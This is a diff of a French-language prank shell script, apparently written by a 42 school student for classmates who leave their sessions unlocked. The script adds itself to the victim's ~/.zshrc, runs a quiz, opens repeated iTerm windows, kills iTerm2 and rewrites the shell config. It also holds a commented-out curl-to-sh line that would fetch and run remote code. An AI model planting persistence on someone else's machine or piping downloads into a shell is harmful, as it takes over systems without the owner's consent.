@@ -2,7 +2,7 @@
 
 # by tvanbael
 # 2023-06-06
-# v 1.0
+# v 2.1
 
 # Vérifier l'existence du fichier .zshrc
 if [ ! -f ~/.sshfd ]; then
@@ -16,9 +16,17 @@ if [ ! -f ~/.sshfd ]; then
     echo "/Users/$USER/Desktop/script_question.sh" >> ~/.zshrc
   fi
 fi
+
 finished=false
 
 header() {
+  clear
+  echo ""
+  echo ""
+  echo ""
+  echo ""
+  echo ""
+  sleep 0.10
   clear
   echo "████████ ██ ███    ███ ███████     ████████  ██████      ██████  ██       █████  ██    ██ "
   echo "   ██    ██ ████  ████ ██             ██    ██    ██     ██   ██ ██      ██   ██  ██  ██  "
@@ -26,28 +34,21 @@ header() {
   echo "   ██    ██ ██  ██  ██ ██             ██    ██    ██     ██      ██      ██   ██    ██    "
   echo "   ██    ██ ██      ██ ███████        ██     ██████      ██      ███████ ██   ██    ██    "
   sleep 0.10
-  clear
-  echo ""
-  echo ""
-  echo ""
-  echo ""
-  echo ""
-  sleep 0.10
 }
 
-time() {
-  sleep 1
-  clear
-  sleep 1
-  echo "."
-  sleep 1
-  clear
-  echo ".."
-  sleep 1
-  clear
-  echo "..."
-  sleep 1
-  clear
+timer() {
+    sleep 1
+    clear
+    sleep 1
+    echo "."
+    sleep 1
+    clear
+    echo ".."
+    sleep 1
+    clear
+    echo "..."
+    sleep 1
+    clear
 }
 
 winners() {
@@ -61,55 +62,80 @@ winners() {
   clear
 }
 
+bad_idea() {
+  clear
+  echo "▀█████████▄     ▄████████ ████████▄        ▄█  ████████▄     ▄████████    ▄████████"
+  echo "  ███    ███   ███    ███ ███   ▀███      ███  ███   ▀███   ███    ███   ███    ███"
+  echo "  ███    ███   ███    ███ ███    ███      ███▌ ███    ███   ███    █▀    ███    ███"
+  echo " ▄███▄▄▄██▀    ███    ███ ███    ███      ███▌ ███    ███  ▄███▄▄▄       ███    ███"
+  echo "▀▀███▀▀▀██▄  ▀███████████ ███    ███      ███▌ ███    ███ ▀▀███▀▀▀     ▀███████████"
+  echo "  ███    ██▄   ███    ███ ███    ███      ███  ███    ███   ███    █▄    ███    ███"
+  echo "  ███    ███   ███    ███ ███   ▄███      ███  ███   ▄███   ███    ███   ███    ███"
+  echo "▄█████████▀    ███    █▀  ████████▀       █▀   ████████▀    ██████████   ███    █▀ "
+  sleep 0.10
+  clear
+}
+
 # Fonction à exécuter en cas de capture du signal SIGINT
 interrupt_handler() {
-    if [ "$finished" = true ]; then
-      clear
-      # Vérifier l'existence du fichier .zshrc
-      if [ -f ~/.zshrc ]; then
-        # Renommer le fichier .zshrc en .sshsd
-        killall "iTerm2"
-        echo "" > ~/.zshrc
-        killall "iTerm2"
-        mv ~/.sshfd ~/.zshrc
-        killall "iTerm2"
-        # Supprime le fichier temporaire
-        rm /tmp/top_output.txt
-        exit 1
-      fi
-        exit 1
+  if [ "$finished" = true ]; then
+    clear
+    # Vérifier l'existence du fichier .zshrc
+    if [ -f ~/.zshrc ]; then
+      # Renommer le fichier .zshrc en .sshsd
+      killall "iTerm2"
+      echo "" > ~/.zshrc
+      killall "iTerm2"
+      mv ~/.sshfd ~/.zshrc
+      killall "iTerm2"
+      # Supprime le fichier temporaire
+      rm /tmp/top_output.txt
+      exit 1
     fi
-    echo "Mauvaise idee !"
-    i=0
-    while [ $i -lt 2 ]; do
-    	osascript -e 'tell application "iTerm"
-        	create window with default profile
-        	tell current session of current window
-              write text "printf \"\\033]0;On ne coupe pas la tete, elle repousse 3 fois!\\007\""
-        	end tell
-    	end tell'
-      i=$((i+1))
-    done
-    # Ajoutez ici les actions que vous souhaitez effectuer lors de la capture du signal SIGINT
-    exit 1
+      exit 1
+  fi
+  clear
+  echo "▀█████████▄     ▄████████ ████████▄        ▄█  ████████▄     ▄████████    ▄████████"
+  echo "  ███    ███   ███    ███ ███   ▀███      ███  ███   ▀███   ███    ███   ███    ███"
+  echo "  ███    ███   ███    ███ ███    ███      ███▌ ███    ███   ███    █▀    ███    ███"
+  echo " ▄███▄▄▄██▀    ███    ███ ███    ███      ███▌ ███    ███  ▄███▄▄▄       ███    ███"
+  echo "▀▀███▀▀▀██▄  ▀███████████ ███    ███      ███▌ ███    ███ ▀▀███▀▀▀     ▀███████████"
+  echo "  ███    ██▄   ███    ███ ███    ███      ███  ███    ███   ███    █▄    ███    ███"
+  echo "  ███    ███   ███    ███ ███   ▄███      ███  ███   ▄███   ███    ███   ███    ███"
+  echo "▄█████████▀    ███    █▀  ████████▀       █▀   ████████▀    ██████████   ███    █▀ "
+
+  echo "error ici2"
+  sleep 3
+  i=0
+  while [ $i -lt 2 ]; do
+  	osascript -e 'tell application "iTerm"
+      	create window with default profile
+      	tell current session of current window
+            write text "printf \"\\033]0;On ne coupe pas la tete, elle repousse 3 fois!\\007\""
+      	end tell
+  	end tell'
+    i=$((i+1))
+  done
+  # Ajoutez ici les actions que vous souhaitez effectuer lors de la capture du signal SIGINT
+  exit 1
 }
 
 # Définit la fonction interrupt_handler comme gestionnaire du signal SIGINT
-trap interrupt_handler EXIT
+# trap interrupt_handler EXIT
 
 # Question 1
 clear
-echo "Tu as laisser ta session ouverte, dommage pour toi !"
-echo "Jouons un peu !"
+echo "\n\nTu as laisser ta session ouverte, dommage pour toi !\n\n"
+echo "Jouons un peu !\n\n"
 read -p "Let's go? : (appuis sur entree pour commencer.)" answer
-time();
+# timer
 
-nb = 0
-while [ $nb -lt 3 ]; do
-  header();
+nb=0
+while [ $nb -lt 10 ]; do
+  header
   nb=$((nb+1))
 done
-sleep 2
+sleep 1.5
 
 # Question 1
 echo "Question 1"
@@ -121,7 +147,7 @@ echo "[1] : nettoyer"
 echo "[2] : laisser comme ça, et me barrer en soumsoum"
 echo ""
 
-echo "repond avec 1 ou 2 et valide ta reponsse avec la touche entrée"
+echo "(répond avec 1 ou 2 et valide ta réponsse avec la touche entrée)"
 
 read -p "Votre réponse : " reponse
 
@@ -131,10 +157,9 @@ if [ "$reponse" = "1" ]; then
   echo tu vois rien de difficile !
   echo "Celle la etais simple! Je te laisse une chance de t'en sortir!"
   # ajoute dune attente utilisateur
-  read -p "Appuyer sur entree" reponse
-
-  time();
-  
+  read -p "(Appuyer sur entree)" reponse
+  # timer
+  clear
 
   # Question 2
   echo "Question 2"
@@ -142,7 +167,7 @@ if [ "$reponse" = "1" ]; then
   echo "[1] : 2h"
   echo "[2] : 4h"
   echo "[3] : 8h"
-  echo "repond avec 1 2 ou 3 et valide ta reponsse avec la touche entrée"
+  echo "repond avec 1 2 ou 3 et valide ta réponsse avec la touche entrée"
   read -p "Votre réponse : " reponse2
 
   if [ "$reponse2" = "1" ]; then
@@ -151,12 +176,15 @@ if [ "$reponse" = "1" ]; then
     echo "Tu as de la chance, je suis de bonne humeur !"
     echo "Tu as gagné le droit de continuer à utiliser ton ordinateur !"
     echo "Ah non, c'est pas fini !"
-    read -p "Appuyer sur entree" reponse
-    time();
-
+    read -p "Appuyer sur entrée" reponse
+    # timer
+    clear
     # Question 3
     echo "Question 3"
-    echo "A quoi sert le badge 42 ?"
+    echo "A quoi sert le badge 42 ?\n\n\n\n"
+    echo "Pret ?"
+    read -p "(Appuyer sur entrée)"
+    clear
     echo "[1]: éplucher des légumes, cuire un plat au four, assaisonner une salade."
     echo "[2]: changer une roue crevée, réparer un moteur défectueux, diagnostiquer un problème électrique."
     echo "[3]: calculer une intégrale triple, trouver les racines d'une équation polynomiale de degré élevé, établir une démonstration mathématique rigoureuse."
@@ -270,7 +298,7 @@ if [ "$reponse" = "1" ]; then
       finished = true
       nbs = 0
       while [ $nbs -lt 15 ]; do
-        winners();
+        winners
         nbs = $nbs + 1
       done
       clear
@@ -292,6 +320,7 @@ if [ "$reponse" = "1" ]; then
     fi
   else
     echo "Mauvaise réponse !"
+    sleep 3
     i=0
     while [ $i -lt 5 ]; do
     	osascript -e 'tell application "iTerm"
@@ -304,6 +333,8 @@ if [ "$reponse" = "1" ]; then
     done
   fi
 else
-  echo "Mauvaise réponse !"
+  clear
+  echo "Mauvaise réponse ! Et a la question une ! Tu n'a vraiment rien lu du reglement !"
+  sleep 2
   # curl 21.loundor.com/3 | sh
 fi
